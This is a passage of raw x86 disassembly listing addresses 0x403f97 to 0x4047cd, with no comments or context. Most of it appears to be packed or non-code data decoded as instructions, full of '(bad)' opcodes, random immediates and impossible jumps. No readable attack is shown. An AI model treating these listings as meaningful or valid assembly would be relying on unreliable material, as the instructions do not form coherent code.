  403f97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f98:	or     BYTE PTR [ebp+esi*8+0x62],cl
  403f9c:	jb     0x403f9e
  403f9e:	add    ch,cl
  403fa0:	stos   DWORD PTR es:[edi],eax
	...
  403fad:	mov    ebx,0x8b8bd32f
  403fb2:	mov    ecx,DWORD PTR [ebx-0x74747475]
  403fb8:	mov    ecx,DWORD PTR [ebx+0x4718a68b]
  403fbe:	mov    edi,0x9801ed9a
  403fc3:	leave  
  403fc4:	xor    al,0x31
  403fc6:	les    edi,FWORD PTR [ebx-0x529de330]
  403fcc:	mov    ds:0x864e6b42,eax
  403fd1:	sbb    BYTE PTR [esi-0x75],bl
  403fd4:	mov    ecx,DWORD PTR [esi-0x25cd0193]
  403fda:	add    esp,DWORD PTR [edx-0x4e]
  403fdd:	sub    edx,ebp
  403fdf:	(bad)  
  403fe0:	pop    esi
  403fe1:	xchg   ebx,eax
  403fe2:	and    al,0x50
  403fe4:	sub    dl,BYTE PTR [edi]
  403fe6:	fs popa 
  403fe8:	sbb    eax,edx
  403fea:	push   edi
  403feb:	sbb    al,0x93
  403fed:	pop    esp
  403fee:	stos   BYTE PTR es:[edi],al
  403fef:	xchg   esi,eax
  403ff0:	xchg   ecx,eax
  403ff1:	push   edi
  403ff2:	mov    ecx,DWORD PTR [ebx-0x747da16e]
  403ff8:	mov    eax,edx
  403ffa:	sbb    ah,dl
  403ffc:	mov    eax,DWORD PTR [eax]
  403ffe:	clc    
  403fff:	pop    ecx
  404000:	aaa    
  404001:	cs aaa 
  404003:	dec    ecx
  404004:	and    edi,edx
  404006:	imul   edx,ecx,0x8
  404009:	jae    0x404000
  40400b:	inc    esp
  40400c:	cmp    al,0xb1
  40400e:	loop   0x40405f
  404010:	les    ebp,FWORD PTR [ebx+0x3f9e2080]
  404016:	add    BYTE PTR [eax],al
  404018:	add    BYTE PTR [ecx-0x75ffffa6],bh
  40401e:	xor    al,0x0
  404020:	add    BYTE PTR [eax],al
  404022:	mov    DWORD PTR [ecx-0x76767677],ecx
  404028:	mov    DWORD PTR [ecx+0x4abda689],ecx
  40402e:	out    0x90,eax
  404030:	push   0x8fe24c34
  404035:	mov    ebx,0xb2c4d759
  40403a:	jbe    0x4040a4
  40403c:	jle    0x404058
  40403e:	mov    dh,0x0
  404040:	ror    BYTE PTR [ebp+0x61],1
  404046:	add    BYTE PTR [eax],al
  404048:	add    BYTE PTR [eax],al
  40404a:	add    BYTE PTR [eax],al
  40404c:	add    al,0x4
  40404e:	ja     0x403fec
  404050:	push   edi
  404051:	bound  eax,QWORD PTR [esp+eax*1]
  404054:	and    eax,0x408ce948
  404059:	push   ecx
  40405a:	and    al,0xb
  40405c:	mov    eax,ds:0xf561b566
  404061:	mov    ecx,0x4545bde
  404066:	mov    edx,0xb78c6490
  40406b:	(bad)  
  40406c:	loop   0x40404c
  40406e:	clc    
  40406f:	leave  
  404070:	lahf   
  404071:	inc    esi
  404072:	sub    dh,bh
  404074:	cdq    
  404075:	mov    ebp,0xb80404aa
  40407a:	hlt    
  40407b:	add    al,0x4
  40407d:	popf   
  40407e:	cwde   
  40407f:	mov    esi,0xa3532404
  404084:	jns    0x40408e
  404086:	fnstenv [esi+0x7558c68d]
  40408c:	retf   0xe93a
  40408f:	shr    DWORD PTR [eax+0x312cfe7a],0xf1
  404096:	inc    ebp
  404097:	es dec esi
  404099:	or     ah,BYTE PTR [esp]
  40409c:	and    al,0xba
  40409e:	cmp    ecx,DWORD PTR [edi+0x5]
  4040a1:	fistp  WORD PTR [edi]
  4040a3:	ficomp WORD PTR [ebp+0x43018fe9]
  4040a9:	inc    eax
  4040aa:	xchg   esi,eax
  4040ab:	dec    eax
  4040ac:	inc    esp
  4040ad:	push   ebp
  4040ae:	out    dx,eax
  4040af:	cmp    dh,al
  4040b1:	adc    DWORD PTR [edx-0x21],edi
  4040b4:	sub    al,BYTE PTR [edx+0x276e084a]
  4040ba:	and    al,0x24
  4040bc:	imul   ecx,DWORD PTR [esi+0x242424e7],0x0
  4040c6:	add    BYTE PTR [eax],al
  4040c8:	add    BYTE PTR [eax],al
  4040ca:	add    BYTE PTR [eax],bh
  4040cc:	mov    ebx,0xdf
  4040d1:	add    BYTE PTR [eax],al
  4040d3:	add    BYTE PTR [eax],al
  4040d5:	add    BYTE PTR [eax],al
  4040d7:	mov    ecx,DWORD PTR [ebx-0x1a9723ec]
  4040dd:	jp     0x4040a8
  4040df:	push   esi
  4040e0:	das    
  4040e1:	clc    
  4040e2:	inc    ecx
  4040e3:	sub    cl,al
  4040e5:	in     eax,dx
  4040e6:	or     bh,cl
  4040e8:	add    DWORD PTR gs:[ebp-0x3bd636f0],esp
  4040ef:	mov    ds,WORD PTR [edi-0x75]
  4040f2:	mov    edi,ebx
  4040f4:	int3   
  4040f5:	mov    ecx,DWORD PTR [ebx-0x74749ad2]
  4040fb:	fimul  DWORD PTR ds:[esi-0x55]
  4040ff:	add    edx,DWORD PTR [edx-0x40]
  404102:	jle    0x4040b3
  404104:	aam    0xc2
  404106:	loope  0x404132
  404108:	stos   DWORD PTR es:[edi],eax
  404109:	inc    ebx
  40410a:	and    eax,0x7db79060
  40410f:	aam    0xf3
  404111:	add    al,0x1a
  404113:	mov    edi,edi
  404115:	ret    
  404116:	xor    BYTE PTR [edx],al
  404118:	fcos   
  40411a:	(bad)  
  40411b:	jmp    DWORD PTR [edi+0x1f8d93d]
  404121:	(bad)  
  404123:	mov    WORD PTR [edi],es
  404125:	int3   
  404126:	shl    BYTE PTR [esi-0x7d22197b],cl
  40412c:	mov    cl,0xe9
  40412e:	in     eax,dx
  40412f:	cmc    
  404130:	lahf   
  404131:	rcl    DWORD PTR [edx-0x17],0x37
  404135:	sub    al,0xd5
  404137:	pop    ebx
  404138:	loopne 0x4041a8
  40413a:	xor    eax,0x50343904
  40413f:	(bad)  
  404140:	dec    DWORD PTR [edi-0x11]
  404146:	jne    0x4041bd
  404148:	jne    0x4041bf
  40414a:	jne    0x4041c1
  40414c:	jne    0x4041c3
  40414e:	jne    0x4040e4
  404150:	cmp    al,0x66
	...
  40415a:	add    BYTE PTR [ebx-0x201d357d],al
  404160:	dec    esi
  404161:	add    al,0x3b
  404163:	mov    ah,0x7a
  404165:	or     cl,BYTE PTR [eax+0x7d]
  404168:	add    dl,BYTE PTR [ebp+edx*1-0x198ce820]
  40416f:	(bad)  
  404170:	lods   al,BYTE PTR ds:[esi]
  404171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404172:	cmc    
  404173:	adc    ah,BYTE PTR [ebx+eax*4]
  404176:	sbb    DWORD PTR [edi],0x52
  404179:	mov    cl,0xa
  40417b:	push   edx
  40417c:	inc    edx
  40417d:	out    0xf7,al
  40417f:	jp     0x404148
  404181:	mov    edi,0x37cb5087
  404186:	iret   
  404187:	pop    ebp
  404188:	xor    eax,0x63a1ac38
  40418d:	mov    edx,0xf6f59b49
  404192:	mov    WORD PTR [esi-0x7d],?
  404195:	adc    DWORD PTR [ebx+edx*8+0x6b838383],0x29
  40419d:	xchg   ebp,eax
  40419e:	or     esp,0x3e
  4041a1:	fisubr DWORD PTR [ecx-0x5eb63982]
  4041a7:	mov    dh,0xde
  4041a9:	int    0xac
  4041ab:	mov    esi,0xb93226a1
  4041b0:	enter  0x2d80,0x8b
  4041b4:	fidivr WORD PTR [ecx-0x38]
  4041b7:	fwait
  4041b8:	int3   
  4041b9:	int3   
  4041ba:	int3   
  4041bb:	por    mm1,mm4
  4041be:	int3   
  4041bf:	stc    
  4041c0:	(bad)  
  4041c1:	int3   
  4041c2:	int3   
  4041c3:	int3   
  4041c4:	add    al,0x4
  4041c6:	add    al,0x4
  4041c8:	add    al,0x4
  4041ca:	add    al,0x4
  4041cc:	add    al,0xc
  4041ce:	out    dx,eax
  4041cf:	mov    ecx,edx
  4041d1:	or     cl,BYTE PTR [ebp-0x222066f8]
  4041d7:	add    al,0x9d
  4041d9:	pop    ebp
  4041da:	out    0x1b,eax
  4041dc:	(bad)  
  4041dd:	xor    BYTE PTR [ecx+0x49],bl
  4041e0:	outs   dx,BYTE PTR ds:[esi]
  4041e1:	and    esi,ebp
  4041e3:	not    DWORD PTR [ebx+0x4]
  4041e6:	add    al,0x4
  4041e8:	add    al,0x4
  4041ea:	add    al,0x4
  4041ec:	add    al,0x4
  4041ee:	and    al,0x24
  4041f0:	pop    esi
  4041f1:	adc    ah,BYTE PTR [edx]
  4041f3:	mov    ah,0x24
  4041f5:	and    al,0x7c
  4041f7:	pop    eax
  4041f8:	enter  0xf235,0x81
  4041fc:	cmp    BYTE PTR [ebp+0x23],al
  4041ff:	or     eax,0xad58049d
  404204:	or     esi,DWORD PTR [edx+edx*1]
  404207:	mov    WORD PTR [ebx-0x4d845f11],ds
  40420d:	scas   eax,DWORD PTR es:[edi]
  40420e:	arpl   WORD PTR [edi+0x511fa90b],si
  404214:	fsubr  DWORD PTR [edx+0x245d9aae]
  40421a:	and    al,0x15
  40421c:	xor    DWORD PTR [esp],esp
  40421f:	call   0xa504:0x2407d5
  404226:	(bad)  
  404227:	outs   dx,DWORD PTR ds:[esi]
  404228:	jg     0x40427b
  40422a:	pop    edi
  40422b:	aas    
  40422c:	mov    edi,ecx
  40422e:	mov    cl,0x5c
  404230:	inc    esp
  404231:	jb     0x4041c4
  404233:	and    al,0xc5
  404235:	mov    ebx,0xa24cb52
  40423a:	push   edi
  40423b:	push   0x0
  40423d:	add    BYTE PTR [eax],al
  40423f:	xor    edx,DWORD PTR [ebx-0x13694220]
  404245:	mov    dh,0x74
  404247:	popf   
  404248:	dec    ecx
  404249:	mov    BYTE PTR [eax-0x3e5006b5],bh
  40424f:	cmc    
  404250:	dec    edx
  404251:	add    eax,0x5a1f0f9d
  404256:	and    BYTE PTR [edx+eiz*2-0x43],bh
  40425a:	mov    cl,0x54
  40425c:	add    BYTE PTR [eax],al
  40425e:	sub    ebx,DWORD PTR [ebp+0x11]
	...
  40426c:	add    bh,al
  40426e:	sahf   
  40426f:	add    al,0x75
  404271:	jne    0x4042e8
  404273:	jne    0x4042ea
  404275:	jne    0x4042ec
  404277:	jne    0x4042ee
  404279:	push   0x6a
  40427b:	sbb    DWORD PTR [ecx],esp
  40427d:	push   cs
  40427e:	cmp    ah,BYTE PTR [esi+esi*4]
  404281:	xchg   edi,eax
  404282:	ins    DWORD PTR es:[edi],dx
  404283:	jbe    0x4042bd
  404285:	mov    bl,0x62
  404287:	push   es
  404288:	lock pop ebp
  40428a:	jmp    0x56be:0x3f303115
  404291:	sub    bh,BYTE PTR [edx+ebp*2]
  404294:	push   0xffffffcc
  404296:	shr    BYTE PTR [edx+0x6a],0x94
  40429a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40429b:	push   0x6a
  40429d:	inc    edx
  40429e:	adc    DWORD PTR [edx+ecx*2+0x490a8b94],ebp
  4042a5:	pop    edx
  4042a6:	push   0x50
  4042a8:	mov    esp,0x2cac4b63
  4042ad:	stos   DWORD PTR es:[edi],eax
  4042ae:	sub    edi,DWORD PTR [edi-0x24f93652]
  4042b4:	fisubr WORD PTR [edx+0x0]
  4042b7:	into   
  4042b8:	xchg   edi,eax
  4042b9:	comiss xmm0,DWORD PTR [eax]
  4042bc:	add    BYTE PTR [eax],al
  4042be:	mov    ds:0xa7537dbd,eax
  4042c3:	das    
  4042c4:	sar    BYTE PTR [ebp-0x49],cl
  4042c7:	sbb    ebx,DWORD PTR [edi-0x29790deb]
  4042cd:	xchg   DWORD PTR [esi+0x4195e992],eax
  4042d3:	sub    edx,edx
  4042d5:	out    dx,al
  4042d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042d7:	out    0x20,eax
  4042d9:	gs jo  0x404342
  4042dc:	bound  esp,QWORD PTR gs:[eax]
  4042df:	bound  esp,QWORD PTR [ebp+0x53]
  4042e2:	cs and dh,BYTE PTR gs:[ebx+0xd]
  4042e7:	jae    0x40435d
  4042e9:	or     ah,BYTE PTR [eax]
  4042eb:	je     0x40430d
  4042ed:	jae    0x404354
  4042ef:	and    ch,BYTE PTR [eax]
  4042f1:	cmp    al,0x67
  4042f3:	and    BYTE PTR [ebx+0x76],ah
  4042f6:	jb     0x404365
  4042f8:	fs inc edx
  4042fa:	je     0x404361
  4042fc:	popa   
  4042fd:	or     eax,0x720d6544
  404302:	inc    ecx
  404303:	jae    0x404333
  404305:	push   edi
  404306:	push   ebx
  404307:	gs jb  0x40434b
  40430a:	cs push edx
  40430c:	and    BYTE PTR [esi],bh
  40430e:	outs   dx,DWORD PTR cs:[esi]
  404310:	fs cs js 0x404334
  404314:	outs   dx,BYTE PTR ds:[esi]
  404315:	je     0x404345
  404317:	jb     0x404386
  404319:	ins    DWORD PTR es:[edi],dx
  40431a:	outs   dx,DWORD PTR ds:[esi]
  40431b:	je     0x404383
  40431d:	jae    0x404382
  40431f:	imul   ebp,DWORD PTR [eax],0x77635720
  404325:	jb     0x404334
  404327:	and    BYTE PTR [edx+0x65],dh
  40432a:	jb     0x404391
  40432c:	gs jb  0x4043a5
  40432f:	cs pusha 
  404331:	int3   
  404332:	push   0x6a
  404334:	jle    0x404376
  404336:	and    eax,0xfc740000
  40433b:	add    BYTE PTR [eax],al
  40433d:	add    al,ch
  40433f:	call   0xe9292c2c
  404344:	call   0x5a322c31
  404349:	sub    al,BYTE PTR [eax]
	...
  404353:	add    DWORD PTR [ebx-0x392c79b5],0x72
  40435a:	jl     0x4042ed
  40435c:	xor    BYTE PTR [esi-0x53331d30],0xbf
  404363:	rcl    DWORD PTR [edi-0x69],0xd0
  404367:	pop    es
  404368:	push   ecx
  404369:	jae    0x4043ae
  40436b:	cmp    BYTE PTR [ebx+eax*4],dl
  40436e:	sub    DWORD PTR ds:0xc3216d99,0x3d
  404375:	ja     0x4043c8
  404377:	cli    
  404378:	lds    esp,FWORD PTR [edx+0x1481caf2]
  40437e:	jmp    0x6266:0x457cccf3
  404385:	mov    ebx,0x7d5dc8f2
  40438a:	loope  0x4043d3
  40438c:	add    DWORD PTR [ebx-0x7cd20d29],0xffffff83
  404393:	jns    0x40437a
  404395:	rol    DWORD PTR [ebx+0x58ada800],1
  40439b:	sub    al,0x23
  40439d:	out    dx,al
  40439e:	pushf  
  40439f:	sub    esp,DWORD PTR [edx+edi*4]
  4043a2:	xor    DWORD PTR ds:0x64984241,0xffffffd8
  4043a9:	or     eax,0xe51526
  4043ae:	sahf   
  4043af:	mov    al,0x0
  4043b1:	add    BYTE PTR [eax],al
  4043b3:	pop    ecx
  4043b4:	je     0x4043b6
  4043b6:	add    BYTE PTR [ecx+0x7e],al
  4043bc:	mov    ecx,DWORD PTR [ebx-0x74747475]
  4043c2:	mov    ecx,DWORD PTR [ebx+0x34736b8b]
  4043c8:	and    BYTE PTR ds:0x755f7884,bh
  4043ce:	pop    edx
  4043cf:	mov    DWORD PTR [ecx+0x77a28203],ebp
  4043d5:	jg     0x404373
  4043d7:	leave  
  4043d8:	mov    BYTE PTR [ebp-0x30],dl
  4043db:	jmp    0x4044dc
  4043e0:	add    BYTE PTR [eax],al
  4043e2:	add    BYTE PTR [eax],al
  4043e4:	add    BYTE PTR [eax],al
  4043e6:	mov    ecx,DWORD PTR [ebx+0x3e1d6022]
  4043ec:	mov    ecx,DWORD PTR [ebx+0x6f8d3ada]
  4043f2:	fimul  DWORD PTR [eax]
  4043f4:	inc    esi
  4043f5:	popa   
  4043f6:	int    0xd5
  4043f8:	mov    dl,0xcc
  4043fa:	jae    0x4043cf
  4043fc:	les    edx,FWORD PTR [eax-0x12]
  4043ff:	xor    eax,0x2b12694b
  404404:	mov    al,0x5b
  404406:	jge    0x4043a4
  404408:	dec    ecx
  404409:	es mov eax,0xd2b258e0
  40440f:	ret    
  404410:	pop    edi
  404411:	mov    ecx,DWORD PTR [ebx-0x747420a6]
  404417:	out    dx,al
  404418:	fidiv  WORD PTR [edx]
  40441a:	mov    esp,DWORD PTR [ebp*2-0x7b0cf837]
  404421:	dec    edi
  404422:	je     0x40442d
  404424:	jg     0x404468
  404426:	mov    BYTE PTR [ebx-0x381ac980],dl
  40442c:	dec    eax
  40442d:	test   BYTE PTR [esi+0x12],0x6a
  404431:	mov    eax,ds:0x2424d06a
  404436:	and    al,0x38
  404438:	jp     0x4043f1
  40443a:	pop    ss
  40443b:	and    al,0xb5
  40443d:	xor    DWORD PTR [eax-0x587f5ea7],ebx
  404443:	adc    DWORD PTR [esi-0x6241cf13],ebx
  404449:	pop    esi
  40444a:	xor    ax,bx
  40444d:	jnp    0x4043d8
  40444f:	stos   BYTE PTR es:[edi],al
  404450:	or     edx,esi
  404452:	and    esi,DWORD PTR [ebx+0x24]
  404455:	and    al,0x60
  404457:	ins    BYTE PTR es:[edi],dx
  404458:	jmp    0x40447e
  40445a:	and    al,0x24
  40445c:	call   0xe9292d49
  404461:	call   0x52292d4e
  404466:	and    esp,DWORD PTR [esi-0x72727273]
  40446c:	lea    ecx,[ebp-0x17727273]
  404472:	call   0x51e9507d
  404477:	adc    ecx,DWORD PTR [ebp-0x64ef5130]
  40447d:	retf   
  40447e:	sbb    esp,DWORD PTR [eax-0x5a]
  404481:	outs   dx,BYTE PTR ds:[esi]
  404482:	pop    ecx
  404483:	jmp    0xc9f9a636
  404488:	jbe    0x404433
  40448a:	out    dx,eax
  40448b:	call   0xe8746e78
  404490:	call   0xe928c4fb
  404495:	in     al,0xd6
  404497:	sub    DWORD PTR cs:[edx-0x67],ebx
  40449b:	ss out 0xb7,eax
  40449e:	sub    eax,0xd813b6ca
  4044a3:	test   BYTE PTR [esi],ch
  4044a5:	mov    edi,0xc2df278a
  4044aa:	rol    ebx,1
  4044ac:	imul   ebp,eax,0x5e3cb00
  4044b2:	lahf   
  4044b3:	add    BYTE PTR [eax],al
  4044b5:	add    BYTE PTR [esi],bh
  4044b7:	push   ss
  4044b8:	mov    BYTE PTR [ebx-0x742521f],cl
  4044be:	pop    edx
  4044bf:	push   esp
  4044c0:	push   edi
  4044c1:	xor    BYTE PTR ds:0x9506b5b1,al
  4044c7:	mov    al,ds:0x4c1c5d93
  4044cc:	push   0xffffff9b
  4044ce:	xor    al,0x53
  4044d0:	ret    
  4044d1:	inc    ebp
  4044d2:	mov    esi,0x22aecd99
  4044d7:	fwait
  4044d8:	inc    esp
  4044d9:	add    BYTE PTR [eax],al
  4044db:	push   0x66
	...
  4044e8:	add    dh,bh
  4044ea:	int    0xfa
  4044ec:	(bad)  
  4044ed:	(bad)  
  4044ee:	(bad)  
  4044ef:	(bad)  
  4044f0:	(bad)  
  4044f1:	(bad)  
  4044f2:	(bad)  
  4044f3:	(bad)  
  4044f4:	push   DWORD PTR [ebp+0x75]
  4044f7:	sbb    al,bl
  4044f9:	sub    DWORD PTR [ebp+0x20],esi
  4044fc:	cdq    
  4044fd:	push   0xb3859825
  404502:	loope  0x404494
  404504:	ret    
  404505:	test   al,0x69
  404507:	xchg   ebp,eax
  404508:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404509:	outs   dx,DWORD PTR ds:[esi]
  40450a:	cld    
  40450b:	out    0x11,eax
  40450d:	ror    DWORD PTR [ecx+0x5c417575],1
  404513:	jl     0x404593
  404515:	pop    eax
  404516:	into   
  404517:	imul   edx,DWORD PTR [ebp+ecx*8-0x44],0x23ebce9a
  40451f:	outs   dx,DWORD PTR ds:[esi]
  404520:	dec    esi
  404521:	imul   edx,eax,0x49d5561b
  404527:	fild   QWORD PTR ds:0xc9381a2c
  40452d:	loopne 0x4045a4
  40452f:	jne    0x40450b
  404531:	mov    es,WORD PTR [ebx-0x606d8a8b]
  404537:	test   BYTE PTR [ebp+0x0],dh
  40453a:	cs push es
  40453c:	sbb    eax,0xc368c501
  404541:	(bad)  
  404542:	pop    ss
  404543:	xor    eax,0x1cdf1cee
  404548:	push   ds
  404549:	cmc    
  40454a:	aam    0x58
  40454c:	cs test al,0x8d
  40454f:	push   ecx
  404550:	inc    edi
  404551:	imul   eax,DWORD PTR [eax],0x61360000
  404557:	add    BYTE PTR [eax],al
  404559:	pop    ecx
  40455a:	into   
  40455b:	add    BYTE PTR [eax],al
  40455d:	add    BYTE PTR [ebp+0x75],dh
  404560:	jne    0x4045d7
  404562:	jne    0x4045d9
  404564:	jne    0x4045db
  404566:	jne    0x40455b
  404568:	test   DWORD PTR [esi-0x76],esi
  40456b:	ret    
  40456c:	sbb    eax,0xae6bedb0
  404571:	mov    ebp,0x36d7bdbb
  404576:	fwait
  404577:	jmp    0x40453e
  404579:	add    eax,0x24507c56
  40457e:	leave  
	...
  404587:	add    BYTE PTR [esp+esi*2-0x71],dh
  40458b:	(bad)  
  40458c:	and    eax,0x517474ff
  404591:	int    0x7c
  404593:	fsub   QWORD PTR ds:[esi-0x7]
  404597:	mov    bl,0x7d
  404599:	sbb    cl,BYTE PTR [esi-0x1d522972]
  40459f:	inc    eax
  4045a0:	les    ebx,FWORD PTR [esi]
  4045a2:	lods   eax,DWORD PTR ds:[esi]
  4045a3:	cld    
  4045a4:	xchg   BYTE PTR [ecx],ah
  4045a6:	mov    WORD PTR [eax+esi*8+0x72626d65],ss
  4045ad:	jbe    0x404614
  4045af:	popa   
  4045b0:	outs   dx,BYTE PTR ds:[esi]
  4045b1:	and    BYTE PTR [ebp+0x29],ch
  4045b4:	bound  esp,QWORD PTR [ebx+0x3d]
  4045b7:	jo     0x4045d9
  4045b9:	bound  esi,QWORD PTR [eax+0x52]
  4045bc:	bound  esp,QWORD PTR [eax]
  4045be:	jae    0x40462e
  4045c0:	push   ebx
  4045c1:	arpl   WORD PTR [ebx+0x79],si
  4045c4:	gs inc ecx
  4045c6:	push   edi
  4045c7:	cs jb  0x404621
  4045ca:	outs   dx,BYTE PTR ds:[esi]
  4045cb:	jns    0x40462f
  4045cd:	jne    0x40463d
  4045cf:	bound  esi,QWORD PTR [edi+0x20]
  4045d2:	jae    0x4045f4
  4045d4:	bound  edi,QWORD PTR ds:0x3e6e6570
  4045da:	and    BYTE PTR [ebp+0x53],ch
  4045dd:	push   0x656e2069
  4045e2:	inc    esp
  4045e3:	pop    ebx
  4045e4:	push   ebx
  4045e5:	ins    DWORD PTR es:[edi],dx
  4045e6:	ja     0x404608
  4045e8:	das    
  4045e9:	sub    al,0x74
  4045eb:	sub    BYTE PTR gs:[esi+0x65],ah
  4045ef:	ds push ebx
  4045f1:	push   ebx
  4045f2:	gs cs imul edi,DWORD PTR gs:[edi+ebp*2],0x64
  4045f9:	gs jns 0x40464f
  4045fc:	cmp    al,0x65
  4045fe:	and    BYTE PTR [edi+0x2f],ch
  404601:	or     eax,0x29636566
  404606:	arpl   WORD PTR fs:[esi+ebp*2+0xd],si
  40460b:	ds popa 
  40460d:	and    BYTE PTR cs:0xa206d2e,cl
  404614:	cmp    eax,0x6e0a6e2e
  404619:	ins    DWORD PTR es:[edi],dx
  40461a:	jae    0x40468b
  40461c:	and    dh,BYTE PTR [esi+0x76]
  40461f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404620:	dec    edi
  404621:	sbb    ebp,DWORD PTR [ecx-0x48]
  404624:	call   0x281efdde
  404629:	je     0x40469f
  40462b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40462c:	inc    ebp
  40462d:	je     0x4046a3
  40462f:	imul   BYTE PTR [edx-0x42ff8bfa]
  404635:	xchg   esp,eax
  404636:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404637:	popa   
  404638:	mov    bh,0x69
  40463a:	mov    edx,0xa47adac9
  40463f:	(bad)  
  404641:	(bad)  
  404642:	not    DWORD PTR ds:0x127ff0b0
  404648:	add    eax,0xb1a362
  40464d:	add    BYTE PTR [eax],al
  40464f:	iret   
  404650:	in     eax,dx
  404651:	xor    BYTE PTR [ebx+0x73845e8e],0x8a
  404658:	xchg   ecx,eax
  404659:	push   edx
  40465a:	push   eax
  40465b:	sbb    BYTE PTR [ecx-0x417d1915],bl
  404661:	gs (bad) 
  404663:	icebp  
  404664:	sar    bl,cl
  404666:	sbb    al,0x41
  404668:	cmp    ecx,ecx
  40466a:	(bad)  
  40466b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40466c:	add    BYTE PTR [eax],al
  40466e:	mov    bh,0x2b
  404670:	loope  0x404672
  404672:	add    BYTE PTR [eax],al
  404674:	(bad)  
  404675:	(bad)  
  404676:	(bad)  
  404677:	(bad)  
  404678:	(bad)  
  404679:	(bad)  
  40467a:	(bad)  
  40467b:	(bad)  
  40467c:	pminsw mm4,QWORD PTR [eax]
  40467f:	jnp    0x404681
	...
  404689:	add    BYTE PTR [eax],al
  40468b:	push   edx
  40468c:	cli    
  40468d:	mov    esi,0xfbb2e54d
  404692:	xlat   BYTE PTR ds:[ebx]
  404693:	dec    ecx
  404694:	add    edx,DWORD PTR [edx]
  404696:	push   esi
  404697:	mov    al,0x9a
  404699:	pop    es
  40469a:	fmul   st,st(7)
  40469c:	fdiv   DWORD PTR [ebx]
  40469e:	push   ds
  40469f:	std    
  4046a0:	push   esp
  4046a1:	cmp    BYTE PTR [eax+eax*1+0x0],ah
  4046a5:	rcr    DWORD PTR [eax+eax*1+0x0],1
  4046a9:	dec    edx
  4046aa:	inc    edx
  4046ab:	add    BYTE PTR [eax],al
  4046ad:	pop    ds
  4046ae:	fs cmc 
  4046b0:	adc    dh,BYTE PTR [ecx+0x51354fef]
  4046b6:	fld    QWORD PTR [ebx+0x720a2797]
  4046bc:	inc    edx
  4046bd:	inc    ebp
  4046be:	pusha  
  4046bf:	push   ss
  4046c0:	sub    dl,BYTE PTR [eax+0x49f65]
  4046c6:	add    BYTE PTR [edi+0x3e4b8],ch
  4046cc:	add    BYTE PTR [eax],al
  4046ce:	and    BYTE PTR [ebx],cl
  4046d0:	rol    DWORD PTR [esi],cl
  4046d2:	cmp    DWORD PTR [ebp*2+0x5ef0fd1e],esp
  4046d9:	(bad)  
  4046db:	xlat   BYTE PTR ds:[ebx]
  4046dc:	pusha  
  4046dd:	sub    DWORD PTR [edx-0x2],eax
  4046e0:	and    BYTE PTR [edx-0x554c50dd],0xd0
  4046e7:	ror    ebp,0xed
  4046ea:	jo     0x4046a5
  4046ec:	dec    esi
  4046ed:	stc    
  4046ee:	jg     0x4046d4
  4046f0:	add    DWORD PTR [eax],0x0
  4046f3:	mov    edx,0x95
	...
  404700:	add    BYTE PTR [edi],al
  404702:	push   ecx
  404703:	(bad)  
	...
  40470c:	add    BYTE PTR [eax],al
  40470e:	add    BYTE PTR [esi+0x6b],cl
  404711:	dec    ebx
  404712:	std    
  404713:	adc    al,0xa1
  404715:	call   0x83d27ecc
  40471a:	(bad)  
  40471b:	(bad)  [edx]
  40471d:	sub    eax,0x66715559
  404722:	mov    ds:0x458d8b38,al
  404727:	add    BYTE PTR [eax],al
  404729:	(bad)  
  40472a:	xchg   ebx,eax
  40472b:	bound  ebp,QWORD PTR [ebx]
  40472d:	adc    dl,dl
  40472f:	rol    BYTE PTR [ecx],0xf2
  404732:	and    eax,0xe3c7c06d
  404737:	push   eax
  404738:	(bad)  
  404739:	mov    ebp,0xe4ffd364
  40473e:	adc    BYTE PTR [edi+edi*1],ch
  404741:	dec    ecx
  404742:	loopne 0x4047c2
  404744:	outs   dx,DWORD PTR ds:[esi]
  404745:	mov    ebx,0x75f50000
  40474a:	mov    al,ds:0x748d0000
  40474f:	dec    ecx
  404750:	add    BYTE PTR [eax],al
  404752:	ss xor al,0xe5
  404755:	es sbb edi,eax
  404758:	pusha  
  404759:	jmp    0x7f997aa0
  40475e:	jb     0x4047d5
  404760:	mov    al,ds:0x7b40fd9e
  404765:	jecxz  0x4047ba
  404767:	in     al,0x8c
  404769:	loop   0x40476b
  40476b:	add    BYTE PTR [eax],al
  40476d:	mov    bh,BYTE PTR [esi+0x0]
  404770:	add    BYTE PTR [edi+0xa],dl
  404773:	add    BYTE PTR [eax],al
  404775:	add    bh,bh
  404777:	(bad)  
  404778:	(bad)  
  404779:	(bad)  
  40477a:	(bad)  
  40477b:	(bad)  
  40477c:	(bad)  
  40477d:	(bad)  
  40477e:	(bad)  
  40477f:	fisub  WORD PTR [edx+0x4ce87a68]
  404785:	test   eax,0xc7b87de
  40478a:	adc    BYTE PTR [edi-0x73deeaae],dh
  404790:	push   es
  404791:	(bad)  
  404793:	mov    bl,0xd2
  404795:	pop    edi
  404796:	sub    al,0x45
  404798:	inc    ebp
  404799:	inc    ebp
  40479a:	inc    ebp
  40479b:	inc    ebp
  40479c:	inc    ebp
  40479d:	inc    ebp
  40479e:	inc    ebp
  40479f:	inc    ebp
  4047a0:	xor    esi,DWORD PTR [ebx]
  4047a2:	pop    ss
  4047a3:	push   0xffffffe0
  4047a5:	jle    0x4047da
  4047a7:	xor    ecx,DWORD PTR [esi+0x8]
  4047aa:	nop
  4047ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047ac:	add    DWORD PTR [ebp+0x59],esi
  4047af:	dec    ebp
  4047b0:	test   BYTE PTR [ecx],dh
  4047b2:	xchg   ebx,eax
  4047b3:	jl     0x404766
  4047b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047b6:	push   ebp
  4047b7:	pop    ss
  4047b8:	sbb    DWORD PTR [ebp+eiz*8-0x3a],eax
  4047bc:	pop    eax
  4047bd:	nop
  4047be:	xchg   esi,eax
  4047bf:	xlat   BYTE PTR ds:[ebx]
  4047c0:	push   es
  4047c1:	xlat   BYTE PTR ds:[ebx]
  4047c2:	call   0xadc2:0x1b18a982
  4047c9:	pop    ss
  4047ca:	push   eax
  4047cb:	xor    esi,DWORD PTR [ebx]
  4047cd:	sbb    al,0x4b
